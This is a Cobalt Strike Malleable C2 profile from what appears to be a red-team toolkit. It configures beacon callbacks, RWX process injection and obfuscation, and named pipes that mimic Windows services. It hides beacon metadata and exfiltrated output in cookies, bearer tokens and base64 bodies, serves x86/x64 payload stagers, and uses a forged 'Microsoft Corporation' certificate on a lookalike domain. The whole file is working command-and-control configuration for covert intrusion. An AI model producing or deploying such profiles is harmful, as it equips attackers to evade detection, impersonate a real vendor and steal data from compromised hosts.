# redteam_toolkit/c2_profiles/cobaltstrike/beacons.profile

set sleeptime "90000";
set jitter    "25";
set maxdns    "235";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36";
set dns_idle  "8.8.8.8";
set dns_maxtxt "250";

set process-inject-start RWX;
set process-inject-use RWX;
set obfuscate "true";
set smartinject "true";

set pipename "msrpcsvc_%rand%";
set pipename_stager "printspoofsvc_%rand%";
set crypto_scheme "netapi";

http-get {
    set uri "/api/status/checkin /login/status /favicon.ico";
    client {
        header "Host" "update.microsoft-service-net.com";
        header "X-Requested-With" "XMLHttpRequest";
        header "X-Session-Token" "%sessionid%";
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }
    server {
        output {
            print;
            prepend "response=";
        }
    }
}

http-post {
    set uri "/api/v1/sync/update /status/sync";
    client {
        id {
            base64url;
            prepend "Authorization: Bearer ";
            header "Authorization";
        }
        output {
            base64;
            print;
        }
    }
    server {
        output {
            base64;
            prepend "X-Result: ";
            header "X-Result";
        }
    }
}

http-stager {
    set uri_x86 "/static/updates/init.bin";
    set uri_x64 "/static/updates/init64.bin";
    client {
        header "Accept" "*/*";
        header "Connection" "keep-alive";
    }
}

https-certificate {
    set C  "US";
    set CN "api.microsoft-service-net.com";
    set O  "Microsoft Corporation";
    set OU "Security Division";
    set validity "365";
}

http-config {
    set headers "Server: Microsoft-IIS/10.0\nX-Powered-By: ASP.NET\n";
    set trust_x_forwarded_for "true";
    set host_stage "true";
}
